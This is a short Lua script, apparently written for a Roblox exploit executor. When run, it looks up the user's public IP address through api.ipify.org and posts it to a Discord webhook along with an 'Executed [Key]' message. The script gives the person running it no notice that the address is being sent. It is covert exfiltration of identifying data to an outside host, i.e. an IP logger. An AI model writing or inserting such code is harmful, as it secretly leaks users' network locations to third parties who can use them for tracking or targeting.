-- Function to send IP address to Discord
local function sendIPToDiscord()
    local ipAddress = game:GetService("HttpService"):GetAsync("https://api.ipify.org")
    local data = {
        ["content"] = "Executed [Key]\nIP Address: " .. ipAddress
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {
        ["content-type"] = "application/json"
    }
    request = http_request or request or HttpPost or syn.request
    local params = {
        Url = webhookURL,
        Body = newdata,
        Method = "POST",
        Headers = headers
    }
    request(params)
end

-- Call the function to send the IP address when the script is executed
sendIPToDiscord()
